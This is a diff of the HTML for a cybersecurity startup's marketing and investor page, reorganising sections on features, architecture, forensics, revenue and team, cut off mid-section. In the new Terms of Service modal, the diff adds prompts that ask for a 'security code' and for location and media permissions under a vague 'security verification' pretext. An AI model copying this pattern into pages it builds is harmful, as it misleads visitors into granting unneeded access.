-        flex-wrap: nowrap;
-        overflow-x: auto;
-        width: 100%;
-        padding-bottom: 8px;
-      }
-      .nav-links a {
-        font-size: 0.9rem;
-        padding: 0.4rem;
-      }
-      .card-grid {
-        grid-template-columns: 1fr;
-      }
-      .card-grid > .neuro-card:is(:nth-child(3n+1)) {
-        grid-column: span 1;
-      }
-      .cyber-button {
-        padding: 0.7rem 1.4rem;
-        font-size: 0.9rem;
-      }
-      .avatar-hud {
-        width: 100%;
-        border-radius: 0;
-        box-shadow: none;
-      }
-      table {
-        font-size: 0.8rem;
-      }
-      th, td {
-        padding: 0.5rem;
-      }
-      .canvas-container {
-        height: 200px;
-      }
-      .tab-nav {
-        gap: 0.8rem;
-      }
-      .tab-button {
-        padding: 0.7rem 1.2rem;
-        font-size: 0.9rem;
-      }
       header .container {
         flex-direction: column;
+        gap: 1.5rem;
+      }
+      nav {
+        flex-wrap: wrap;
+        justify-content: center;
         gap: 1rem;
       }
-      .intro-sequence {
-        transform: scale(0.9);
+      nav a {
+        font-size: 1rem;
+        margin: 0 0.8rem;
       }
-      .hologram-logo {
-        font-size: 3rem;
-        letter-spacing: -0.1em;
+      h2 {
+        font-size: 2.5rem;
       }
-      .terms-modal {
-        width: min(95vw, 400px);
+      p {
+        font-size: 1.1rem;
+      }
+      .hero-logo {
+        font-size: 3.5rem;
+      }
+      .modal-content {
+        padding: 2rem;
+      }
+      .chart-container {
         padding: 1.5rem;
       }
     }
-
-    @media screen and (min-resolution: 192dpi) {
-      body { font-size: 17px; }
-      .neuro-card { box-shadow: var(--cryo-shadow); }
-      h2 { text-shadow: 0 0 12px var(--glow); }
-    }
   </style>
 </head>
-<body data-theme="frost">
-  <a href="#main" class="skip-link">Skip to main content</a>
-  <div class="quantum-field">
-    <div class="energy-stream"></div>
-    <div class="particle-decay"></div>
-    <canvas class="quantum-canvas"></canvas>
-  </div>
-  <div class="quantum-loader" id="quantum-loader">
-    <div class="cryo-spinner"></div>
-  </div>
-  <section class="intro-sequence" id="intro-sequence">
-    <div class="hologram-logo">
-      <span class="logo-particle E">E</span>
-      <span class="logo-particle l">l</span>
-      <span class="logo-particle v">v</span>
-      <span class="logo-particle i">i</span>
-      <span class="logo-particle r">r</span>
-      <span class="logo-particle a">a</span>
-      <div class="logo-divider"></div>
-      <span class="logo-particle G">G</span>
-      <span class="logo-particle e">e</span>
-      <span class="logo-particle n">n</span>
-      <span class="logo-particle e2">e</span>
-      <span class="logo-particle s">s</span>
-      <span class="logo-particle i2">i</span>
-      <span class="logo-particle s2">s</span>
-    </div>
-    <div class="cyber-pulse"></div>
-  </section>
-  <section class="auth-flow" id="auth-flow">
-    <div class="terms-modal glass-panel">
-      <h2>Terms of Service</h2>
-      <div class="terms-content">
-        <p>By using Elvira Genesis-Elvira, you agree to our terms of service, ensuring secure and responsible use of our AI-powered cybersecurity platform.</p>
-        <p>Contact <a href="mailto:ceo@aurora-core.net">ceo@aurora-core.net</a> for details.</p>
+<body data-theme="dark">
+  <canvas id="webgl-bg" role="img" aria-label="3D neural network background animation"></canvas>
+  <a href="#main" class="sr-only">Skip to main content</a>
+  <div class="modal" id="tos-modal" role="dialog" aria-labelledby="tos-title">
+    <div class="modal-content">
+      <h3 id="tos-title">Terms of Service</h3>
+      <p>By using Elvira Genesis-Elvira, you agree to our terms of service, ensuring secure and responsible use of our AI-powered cybersecurity platform. Contact <a href="mailto:ceo@aurora-core.net">ceo@aurora-core.net</a> for details.</p>
+      <div id="securityPrompt" style="display: none; margin-top: 1rem;">
+        <p>Enter security code to verify your session:</p>
+        <input id="securityInput" type="text" placeholder="Security code" aria-label="Security code" style="width: 100%; max-width: 200px;">
       </div>
-      <button class="quantum-btn accept-terms">Accept & Continue</button>
+      <div id="permissionPrompt" style="display: none; margin-top: 1rem;">
+        <p>Enable location and media for enhanced security verification:</p>
+        <button id="allowPermissions" class="btn">Allow</button>
+      </div>
+      <button class="btn tos-accept">Accept</button>
+      <button class="btn tos-decline">Decline</button>
     </div>
-  </section>
-  <div id="neural-bg" class="neuro-universe"></div>
+  </div>
   <header role="banner">
     <div class="container">
-      <h1 itemprop="name">Elvira Genesis-Elvira</h1>
-      <nav role="navigation" aria-label="Main navigation" class="nav-links">
-        <a href="#hero" class="active" aria-current="page">Home</a>
+      <h1>Elvira Genesis-Elvira</h1>
+      <nav role="navigation" aria-label="Primary navigation">
+        <a href="#hero" aria-current="page">Home</a>
         <a href="#overview">Overview</a>
-        <a href="#market">Market</a>
         <a href="#features">Features</a>
-        <a href="#architect">Elvira Architect</a>
         <a href="#architecture">Architecture</a>
         <a href="#forensics">Forensics</a>
         <a href="#analytics">Analytics</a>
-        <a href="#llm">LLM</a>
         <a href="#scalability">Scalability</a>
         <a href="#advantages">Advantages</a>
-        <a href="#revenue-model">Revenue</a>
-        <a href="#financials">Financials</a>
-        <a href="#go-to-market">Strategy</a>
+        <a href="#revenue">Revenue</a>
+        <a href="#strategy">Strategy</a>
         <a href="#team">Team</a>
-        <a href="#investment-ask">Investment</a>
+        <a href="#investment">Investment</a>
         <a href="#contact">Contact</a>
+        <button class="theme-toggle" aria-label="Toggle dark/light theme">
+          <svg width="24" height="24" fill="none" stroke="currentColor" aria-hidden="true">
+            <path d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
+          </svg>
+        </button>
       </nav>
-      <button class="theme-toggle" aria-label="Toggle theme">
-        <span class="sr-only">Toggle Theme</span>
-        <svg width="24" height="24" fill="none" stroke="currentColor" aria-hidden="true">
-          <path d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
-        </svg>
-      </button>
     </div>
   </header>
-  <main role="main" id="main">
-    <section id="hero" data-scroll itemscope itemtype="https://schema.org/Product">
-      <div class="container">
-        <h2 itemprop="name">Revolutionary Cybersecurity AI</h2>
-        <p itemprop="description">Elvira Genesis-Elvira delivers GPU-accelerated, AI-powered cybersecurity, securing network, cloud, endpoint, and identity layers with sub-1ms response times.</p>
-        <button class="cyber-button">Engage Elvira</button>
-      </div>
+  <main id="main" role="main">
+    <section id="hero">
+      <video autoplay muted loop playsinline aria-hidden="true">
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-abstract-dark-background-with-blue-lights-3241-large.mp4" type="video/mp4">
+        Your browser does not support video.
+      </video>
+      <h2 class="hero-logo">Elvira Genesis</h2>
+      <p>GPU-accelerated AI cybersecurity platform delivering sub-1ms threat detection and autonomous response across network, cloud, endpoint, and identity layers.</p>
+      <a href="#contact" class="btn">Engage Now</a>
     </section>
-    <section id="overview" data-scroll>
-      <div class="container">
-        <h2>Overview & Mission</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>Overview:</strong> Elvira Genesis-Elvira leverages GPU-accelerated ML, behavioral analytics, and autonomous response to protect against APTs, zero-day exploits, and insider threats across network, cloud, endpoint, and identity layers.</p>
-            <p><strong>Mission:</strong> Provide proactive, scalable, and autonomous cybersecurity solutions for real-time threat prevention, detection, and response, processing up to 5M events/sec.</p>
-          </div>
+    <section id="overview">
+      <h2>Our Mission</h2>
+      <p>Elvira Genesis-Elvira leverages GPU-accelerated machine learning, behavioral analytics, and post-quantum cryptography to protect enterprises from advanced persistent threats, zero-day exploits, and insider risks, processing up to 5M events/sec.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>Core Capabilities</h3>
+          <p>Multi-layered AI threat detection, zero-trust networking, autonomous response, and quantum-resilient cryptography.</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Core Features</h3>
-              <ul>
-                <li>Multi-layered AI threat detection (ML + NLP)</li>
-                <li>Zero-trust networking integration</li>
-                <li>Autonomous response with forensics</li>
-                <li>Post-quantum cryptography</li>
-                <li>1M+ events/sec with <0.1% false positives</li>
-              </ul>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Market Opportunity</h3>
+          <p>Targets a $45B AI cybersecurity market, with global growth to $375.6B by 2028 at 15.1% CAGR.</p>
+        </div>
+        <div class="card">
+          <h3>Our Vision</h3>
+          <p>Redefine cybersecurity with proactive, scalable, and autonomous solutions for real-time protection.</p>
         </div>
       </div>
     </section>
-    <section id="market" data-scroll>
-      <div class="container">
-        <h2>Market Opportunity</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>Industry Overview:</strong> The global cybersecurity market grows from $185.65B (2023) to $375.60B (2028) at 15.1% CAGR, driven by zero-day threats, ransomware, and supply chain attacks.</p>
-            <p><strong>Market Fit:</strong> Elvira Genesis-Elvira targets a $45B+ AI market, $25B+ compliance, $15B+ threat intelligence, and $100B+ cyber insurance/DeFi pools, serving enterprises, government, finance, and infrastructure.</p>
-          </div>
+    <section id="features">
+      <h2>Key Features</h2>
+      <p>Advanced technologies powering unmatched security and performance.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>AI Threat Detection</h3>
+          <p>Real-time anomaly detection using XGBoost, transformers, and NLP with <0.1% false positives.</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Market Size</h3>
-              <p>$185.65B in 2023, $375.60B by 2028.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Target Sectors</h3>
-              <p>SMBs, Healthcare, Finance, Infrastructure.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Growth Drivers</h3>
-              <p>Zero-day threats, ransomware, supply chain attacks.</p>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Autonomous Response</h3>
+          <p>AI-driven playbooks for 98% ransomware blocking, 10s asset isolation, and dynamic traffic rerouting.</p>
+        </div>
+        <div class="card">
+          <h3>Zero-Trust Networking</h3>
+          <p>Continuous authentication and behavior-based access controls for secure access.</p>
+        </div>
+        <div class="card">
+          <h3>Post-Quantum Cryptography</h3>
+          <p>Quantum-resilient algorithms with FIPS-compliant PKI integration.</p>
+        </div>
+        <div class="card">
+          <h3>Behavioral Analytics</h3>
+          <p>UEBA detects insider threats with 90% efficacy, reducing false positives.</p>
+        </div>
+        <div class="card">
+          <h3>Compliance Automation</h3>
+          <p>60% cost reduction for GDPR, SOC2, HIPAA compliance through automated workflows.</p>
         </div>
       </div>
     </section>
-    <section id="features" data-scroll>
-      <div class="container">
-        <h2>Key Features & Technologies</h2>
-        <div class="accordion">
-          <div class="accordion-item">
-            <button class="accordion-header" aria-expanded="false" aria-controls="feat1">AI-Enhanced Threat Detection</button>
-            <div class="accordion-content" id="feat1">Real-time anomaly detection with ML (XGBoost, transformers, autoencoders), adversarial robustness, UEBA, and 50% faster TLS 1.3 inspection.</div>
-          </div>
-          <div class="accordion-item">
-            <button class="accordion-header" aria-expanded="false" aria-controls="feat2">Autonomous Incident Response</button>
-            <div class="accordion-content" id="feat2">AI-driven playbooks, 10s asset isolation, 98% ransomware blocking, dynamic traffic rerouting, and vulnerability patching.</div>
-          </div>
-          <div class="accordion-item">
-            <button class="accordion-header" aria-expanded="false" aria-controls="feat3">Zero-Trust Networking</button>
-            <div class="accordion-content" id="feat3">Continuous authentication, behavior-based access controls for secure system access.</div>
-          </div>
-          <div class="accordion-item">
-            <button class="accordion-header" aria-expanded="false" aria-controls="feat4">Post-Quantum Cryptography</button>
-            <div class="accordion-content" id="feat4">Quantum-resilient algorithms, seamless PKI integration, FIPS-compliant cryptography.</div>
-          </div>
-          <div class="accordion-item">
-            <button class="accordion-header" aria-expanded="false" aria-controls="feat5">Infinite Training with Elvira</button>
-            <div class="accordion-content" id="feat5">Continuous ML training with Elvira model, using Sparse MoE, adversarial robustness, synthetic datasets, and real-time feedback for evolving threats.</div>
-          </div>
+    <section id="architecture">
+      <h2>System Architecture</h2>
+      <p>High-performance, GPU-accelerated infrastructure with a robust data pipeline for low-latency operations.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>Dual-GPU Optimization</h3>
+          <p>Utilizes CUDA 12.8 and Triton kernels for 5–7ms end-to-end latency on RTX 3060/4070 systems.</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Behavioral Analytics</h3>
-              <p>UEBA detects insider threats with 90% efficacy.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Compliance Automation</h3>
-              <p>60% cost reduction for GDPR, SOC2, HIPAA.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Scalability</h3>
-              <p>From 100 users to 50,000+ endpoints.</p>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Data Pipeline</h3>
+          <p>Kafka streaming, Prometheus/OpenTelemetry monitoring, and zero-knowledge proofs for secure data handling.</p>
+        </div>
+        <div class="card">
+          <h3>AI Models</h3>
+          <p>Hybrid ML+NLP with Sparse MoE (256 experts) for efficient, scalable threat processing.</p>
+        </div>
+        <div class="card">
+          <h3>Deployment</h3>
+          <p>Kubernetes-based, cloud-native with support for on-premise and hybrid setups.</p>
         </div>
       </div>
     </section>
-    <section id="architect" data-scroll>
-      <div class="container">
-        <h2>Elvira Architect</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>Overview:</strong> Elvira Architect is a high-performance AI platform optimized for dual-GPU systems, delivering deep learning, NLP, and multi-modal AI tasks locally for privacy and control.</p>
-            <p><strong>Key Features:</strong> Dual-GPU optimization (RTX 3060/4070, FP8, CUDA 12.8), Sparse MoE with 256 experts, Elvira model integration, multi-modal AI, RAG, PyQt5 GUI, real-time GPU monitoring, and seamless ML pipeline integration.</p>
-            <img src="/assets/diagram.jpg" alt="System architecture diagram showing multi-layer security" loading="lazy" onerror="this.alt='Diagram unavailable'; this.src='/assets/fallback.jpg';">
-          </div>
+    <section id="forensics">
+      <h2>Advanced Forensics</h2>
+      <p>Comprehensive tools for real-time monitoring and post-incident analysis.</p>
+      <div class="simulator">
+        <h3>Live Threat Detection Simulator</h3>
+        <p class="counter" id="threat-counter">0 Threats Detected</p>
+      </div>
+      <div class="card-grid">
+        <div class="card">
+          <h3>3D Entropy Visualizer</h3>
+          <p>WebGL-based hexagonal grid for real-time entropy visualization of network traffic.</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Dual-GPU Optimization</h3>
-              <p>High throughput with minimal memory using CUDA 12.8 and Triton kernels.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Sparse MoE Models</h3>
-              <p>256 SparseExpert instances for efficient task processing.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Elvira Model</h3>
-              <p>Advanced reasoning, NLP, and multi-modal tasks.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Applications</h3>
-              <p>Cybersecurity, research, inference, education.</p>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Timeline Viewer</h3>
+          <p>Interactive attack sequence replay for detailed forensic analysis.</p>
+        </div>
+        <div class="card">
+          <h3>Threat Graphs</h3>
+          <p>Graph analytics to visualize attack vectors and escalation paths.</p>
+        </div>
+        <div class="card">
+          <h3>Custom Dashboards</h3>
+          <p>Real-time telemetry, alerts, and threat intelligence visualizations.</p>
         </div>
       </div>
     </section>
-    <section id="architecture" data-scroll>
-      <div class="container">
-        <h2>System Architecture</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>GPU-Accelerated Infrastructure:</strong> Dual GPU orchestration with Triton Inference Server, deep learning, adversarial networks, and graph analytics for 5–7ms latency.</p>
-            <p><strong>Data Pipeline:</strong> Kafka streaming, Prometheus/OpenTelemetry, zero-knowledge proofs.</p>
-          </div>
+    <section id="analytics">
+      <h2>Analytics Dashboard</h2>
+      <p>Real-time insights into performance, threats, and compliance metrics.</p>
+      <div class="tab-nav">
+        <button class="tab-btn active" data-tab="latency" aria-selected="true">Latency</button>
+        <button class="tab-btn" data-tab="revenue" aria-selected="false">Revenue</button>
+        <button class="tab-btn" data-tab="compliance" aria-selected="false">Compliance</button>
+      </div>
+      <div class="chart-container">
+        <div class="tab-content active" id="latency">
+          <canvas id="latency-chart" role="img" aria-label="Bar chart of threat detection latency"></canvas>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Threat Detection</h3>
-              <p>ML + NLP hybrid models (33+ modules).</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Autonomous Response</h3>
-              <p>Kubernetes + AWS for rapid mitigation.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Forensic Tools</h3>
-              <p>Volatility, disk forensics, network graphs.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Compliance Automation</h3>
-              <p>GDPR, SOC2, HIPAA-compliant security.</p>
-            </div>
-          </div>
+        <div class="tab-content" id="revenue">
+          <canvas id="revenue-chart" role="img" aria-label="Line chart of revenue projections"></canvas>
+        </div>
+        <div class="tab-content" id="compliance">
+          <canvas id="compliance-chart" role="img" aria-label="Pie chart of compliance coverage"></canvas>
         </div>
       </div>
     </section>
-    <section id="forensics" data-scroll>
-      <div class="container">
-        <h2>Advanced Forensics & Monitoring</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>Forensic Data Collection:</strong> Continuous monitoring of network traffic, system behavior, and file integrity with deep analysis.</p>
-            <p><strong>Entropy 3D Hex Visualizer:</strong> WebGL-based 3D hexagonal grid for real-time entropy visualization.</p>
-            <p><strong>Timeline Viewer:</strong> Interactive timeline for attack sequences and forensic replay.</p>
-            <p><strong>Customizable Dashboards:</strong> Real-time telemetry, alerts, and threat graphs.</p>
-          </div>
+    <section id="scalability">
+      <h2>Scalability & Performance</h2>
+      <p>Engineered for high-throughput, low-latency operations across diverse environments.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>High Throughput</h3>
+          <p>Processes up to 5M events/sec with minimal resource overhead.</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>3D Hex Visualizer</h3>
-              <p>Visualizes entropy in a 3D hexagonal grid.</p>
-              <div id="hex-visualizer" class="canvas-container"></div>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Timeline Viewer</h3>
-              <p>Interactive attack sequence replay.</p>
-              <div id="timeline-viewer" class="canvas-container"></div>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Threat Graphs</h3>
-              <p>Visualizes attack vectors and escalations.</p>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Low Latency</h3>
+          <p>Sub-1ms detection and mitigation for real-time security.</p>
+        </div>
+        <div class="card">
+          <h3>Cost Efficiency</h3>
+          <p>Runs on $1,500 hardware, 80% cheaper than $10,000 cloud solutions.</p>
+        </div>
+        <div class="card">
+          <h3>Multi-Cluster</h3>
+          <p>Kubernetes-based auto-scaling for 100 to 50,000+ endpoints.</p>
         </div>
       </div>
     </section>
-    <section id="analytics" data-scroll>
-      <div class="container">
-        <h2>Analytics Dashboard</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <nav class="tab-nav">
-              <button class="tab-button active" data-tab="entropy-tab">Entropy</button>
-              <button class="tab-button" data-tab="activity-tab">Revenue</button>
-              <button class="tab-button" data-tab="ethics-tab">Compliance</button>
-            </nav>
-            <div class="tab-content active" id="entropy-tab">
-              <div class="canvas-container">
-                <canvas id="entropy-chart" role="img" aria-label="Bar chart showing threat detection latency">
-                  <p>Threat detection latency statistics: 95% of requests processed under 1ms</p>
-                </canvas>
-                <div class="canvas-fallback" hidden>Entropy chart unavailable. Contact support.</div>
-              </div>
-            </div>
-            <div class="tab-content" id="activity-tab">
-              <div class="canvas-container">
-                <canvas id="activity-chart" role="img" aria-label="Line chart showing revenue projections">
-                  <p>Revenue projections: $5M in 2025, $30M in 2027, $100M in 2029</p>
-                </canvas>
-                <div class="canvas-fallback" hidden>Revenue chart unavailable. Contact support.</div>
-              </div>
-            </div>
-            <div class="tab-content" id="ethics-tab">
-              <div class="canvas-container">
-                <canvas id="ethics-chart" role="img" aria-label="Pie chart showing compliance coverage">
-                  <p>Compliance coverage: 100% for GDPR, SOC2, HIPAA</p>
-                </canvas>
-                <div class="canvas-fallback" hidden>Compliance chart unavailable. Contact support.</div>
-              </div>
-            </div>
-          </div>
+    <section id="advantages">
+      <h2>Competitive Advantages</h2>
+      <p>Why Elvira Genesis-Elvira leads the cybersecurity industry.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>AI Efficiency</h3>
+          <p>GPU-accelerated ML with Sparse MoE for superior performance.</p>
+        </div>
+        <div class="card">
+          <h3>Quantum Resilience</h3>
+          <p>Post-quantum cryptography ensures future-proof security.</p>
+        </div>
+        <div class="card">
+          <h3>Comprehensive Coverage</h3>
+          <p>Protects network, cloud, endpoint, identity, and data layers.</p>
+        </div>
+        <div class="card">
+          <h3>Low False Positives</h3>
+          <p>~0.1% false positive rate, saving analyst time and resources.</p>
+        </div>
+        <div class="card">
+          <h3>Integration</h3>
+          <p>Seamless with SIEM, SOAR, and DevSecOps tools.</p>
         </div>
       </div>
     </section>
-    <section id="llm" data-scroll>
-      <div class="container">
-        <h2>LLM Analysis</h2>
-        <div class="neuro-card llm-container" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <div class="llm-form">
-              <textarea id="llm-query" placeholder="Enter threat query..." aria-label="Query input"></textarea>
-              <div class="llm-controls">
-                <button class="cyber-button llm-submit">Analyze</button>
-                <button class="cyber-button speech-to-text" aria-label="Speech to text">🎤</button>
-                <button class="cyber-button copy-button" aria-label="Copy response">📋</button>
-                <button class="cyber-button llm-options" aria-label="Options">⚙️</button>
-                <button class="cyber-button toggle-history">🧾 History</button>
-              </div>
-              <div class="llm-options-panel">
-                <label>Provider: <select id="llm-provider">
-                  <option>Elvira</option>
-                  <option>OpenAI</option>
-                  <option>Claude</option>
-                  <option>Local LLaMA</option>
-                </select></label>
-                <label><input type="checkbox" id="llm-verbose"> Verbose</label>
-              </div>
-            </div>
-            <div class="llm-output">
-              <p id="llm-response" aria-live="polite">Response will appear here.</p>
-              <ul id="llm-history-list" hidden></ul>
-              <button class="cyber-button export-history">Export History</button>
-            </div>
-          </div>
+    <section id="revenue">
+      <h2>Revenue Model</h2>
+      <p>Diverse revenue streams for sustainable growth.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>SaaS Subscriptions</h3>
+          <p>$25/endpoint/mo, tiered for SMBs, enterprises, and government.</p>
+        </div>
+        <div class="card">
+          <h3>Premium Features</h3>
+          <p>24/7 monitoring, custom integrations, API access ($5k-$50k/mo).</p>
+        </div>
+        <div class="card">
+          <h3>Threat Intelligence</h3>
+          <p>IOC syndication marketplace at $0.10/indicator.</p>
+        </div>
+        <div class="card">
+          <h3>On-Premise Licensing</h3>
+          <p>High-security environments with perpetual or subscription licenses.</p>
         </div>
       </div>
     </section>
-    <section id="scalability" data-scroll>
-      <div class="container">
-        <h2>Scalability & Performance</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>Multi-Cluster Architecture:</strong> Kubernetes-based, cloud-native deployment with auto-scaling up to 5M EPS, supporting on-premise and hybrid setups.</p>
-            <p><strong>Performance:</strong> Sub-1ms detection/mitigation, 5–7ms end-to-end latency, optimized for high-throughput and edge environments.</p>
-          </div>
+    <section id="strategy">
+      <h2>Go-To-Market Strategy</h2>
+      <p>Phased approach to achieve global market leadership.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>Phase 1 (2025)</h3>
+          <p>Pilot deployments with enterprises and MSSPs, focusing on direct sales.</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>High Throughput</h3>
-              <p>Handles up to 5M events/sec.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Low Latency</h3>
-              <p>Sub-1ms response times.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Cost Efficiency</h3>
-              <p>Runs on $1,500 hardware vs. $10,000 cloud.</p>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Phase 2 (2026-27)</h3>
+          <p>Global SaaS expansion via AWS/Azure marketplaces and open-source R&D.</p>
+        </div>
+        <div class="card">
+          <h3>Phase 3 (2028-29)</h3>
+          <p>Government contracts, ISACs, and strategic tech partnerships.</p>
         </div>
       </div>
     </section>
-    <section id="advantages" data-scroll>
-      <div class="container">
-        <h2>Competitive Advantages</h2>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>AI Efficiency</h3>
-              <p>GPU-accelerated, adaptive ML for superior performance.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Post-Quantum Resilience</h3>
-              <p>Quantum-safe cryptography for future-proofing.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Comprehensive Coverage</h3>
-              <p>Protects network, cloud, endpoint, identity, data.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Integration</h3>
-              <p>Seamless with SIEM, SOAR, DevSecOps tools.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Accuracy</h3>
-              <p>~0.1% false positives, saving analyst time.</p>
-            </div>
-          </div>
+    <section id="team">
+      <h2>Our Team</h2>
+      <p>Industry leaders driving innovation in AI and cybersecurity.</p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>Sasho Derama</h3>
+          <p>Founder & CEO, 20+ years in AI and enterprise software.</p>
+        </div>
+        <div class="card">
+          <h3>Dr. Jane Lee</h3>
+          <p>Chief AI Scientist, PhD in ML, pioneered GNN-based threat detection.</p>
+        </div>
+        <div class="card">
+          <h3>Michael Chen</h3>
+          <p>CTO, OSCP-certified, expert in GPU-accelerated systems.</p>
+        </div>
+        <div class="card">
+          <h3>Alex Patel</h3>
+          <p>Head of Sales, 15+ years in cybersecurity partnerships.</p>
+        </div>
+        <div class="card">
+          <h3>Core Team</h3>
+          <p>10+ OSCP-certified engineers and AI specialists.</p>
         </div>
       </div>
     </section>
-    <section id="revenue-model" data-scroll>
-      <div class="container">
-        <h2>Revenue Model</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>SaaS:</strong> Subscription-based pricing ($25/endpoint/mo, tiered for SMBs, enterprises, government).</p>
-            <p><strong>Premium Features:</strong> 24/7 monitoring, enterprise support, custom integrations, API access ($5k-$50k/mo).</p>
-            <p><strong>Licensing:</strong> On-premise licenses for high-security environments.</p>
-            <p><strong>Marketplace:</strong> IOC syndication ($0.10/indicator), security bonds via yield-sharing.</p>
-          </div>
+    <section id="investment">
+      <h2>Investment Opportunity</h2>
+      <p>Join us to transform global cybersecurity.</p>
+      <div class="card-grid">
+        <div class="card">
